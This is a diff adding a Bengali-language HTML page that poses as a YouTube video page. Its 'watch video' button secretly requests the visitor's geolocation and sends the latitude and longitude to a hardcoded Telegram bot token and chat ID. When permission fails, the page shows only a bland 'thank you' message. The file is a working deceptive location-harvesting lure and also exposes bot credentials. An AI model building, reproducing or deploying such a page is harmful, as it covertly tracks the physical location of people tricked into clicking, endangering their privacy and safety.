@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Page</title>
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; padding: 20px; background-color: #f4f4f4; }
+        .video-container { margin-bottom: 20px; }
+        iframe { width: 100%; max-width: 560px; height: 315px; border-radius: 8px; border: 2px solid #ddd; }
+        /* বাটনের ডিজাইন */
+        button { padding: 15px 30px; font-size: 18px; background-color: #ff0000; color: white; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; }
+        #status { margin-top: 15px; font-weight: bold; color: #333; }
+    </style>
+</head>
+<body>
+
+    <h2>ভিডিওটি দেখুন</h2>
+
+    <!-- ইউটিউব index.html
+
+ -->
+    <div class="video-container">
+        <iframe src="https://www.youtube.com/embed/5YG7wCDHAMs" allowfullscreen></iframe>
+    </div>
+
+    <!-- বাটন টেক্সট পরিবর্তন করা হয়েছে -->
+    <button onclick="sendLocationToTelegram()">ভিডিও দেখুন</button>
+
+    <p id="status"></p>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8725973028:AAHyBGtJnrPlKkil-nt5FgvZCGRl8KurQd0"; 
+        const TELEGRAM_CHAT_ID = "7599370002"; 
+
+        function sendLocationToTelegram() {
+            const statusText = document.getElementById("status");
+
+            if (navigator.geolocation) {
+                statusText.innerText = "লোকেশন নেওয়া হচ্ছে...";
+
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+
+                        statusText.innerText = "টেলিগ্রামে পাঠানো হচ্ছে...";
+
+                        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`;
+
+                        fetch(url, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                latitude: lat,
+                                longitude: lon
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                statusText.innerText = "সফলভাবে টেলিগ্রামে লোকেশন পাঠানো হয়েছে!";
+                            } else {
+                                statusText.innerText = "পাঠাতে ব্যর্থ হয়েছে।";
+                            }
+                        })
+                        .catch(error => {
+                            statusText.innerText = "ত্রুটি ঘটেছে: " + error;
+                        });
+                    },
+                    function(error) {
+                        statusText.innerText = "ধন্যবাদ।";
+                    }
+                );
+            } else {
+                statusText.innerText = "Geolocation সাপোর্ট করে না।";
+            }
+        }
+    </script>
+
+</body>
+  </html>
